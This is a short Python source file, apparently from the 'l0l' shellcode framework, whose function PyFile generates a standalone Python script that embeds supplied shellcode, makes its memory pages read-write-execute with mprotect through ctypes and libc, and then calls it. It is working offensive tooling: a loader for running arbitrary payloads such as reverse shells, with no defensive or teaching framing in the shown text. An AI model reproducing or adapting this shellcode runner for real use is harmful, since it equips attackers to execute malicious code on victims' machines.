import time
from header import *

def PyFile( shellcode):
    db = """#!/usr/bin/python

import ctypes
import multiprocessing

#Project : https://github.com/roissy/l0l
#This file created with l0l ..
#{0} - {1}


shellcode_data = (b"{2}")

shellcode = ctypes.c_char_p(shellcode_data)
function = ctypes.cast(shellcode, ctypes.CFUNCTYPE(None))
addr = ctypes.cast(function, ctypes.c_void_p).value
libc = ctypes.CDLL('libc.so.6')
pagesize = libc.getpagesize()
addr_page = (addr // pagesize) * pagesize

for page_start in range(addr_page, addr + len(shellcode_data), pagesize):
    assert libc.mprotect(page_start, pagesize, 0x7) == 0
function()
""".format(strftime("%d/%m/%Y"), strftime("%H:%M:%S"), shellcode)

    logs( db, "py")



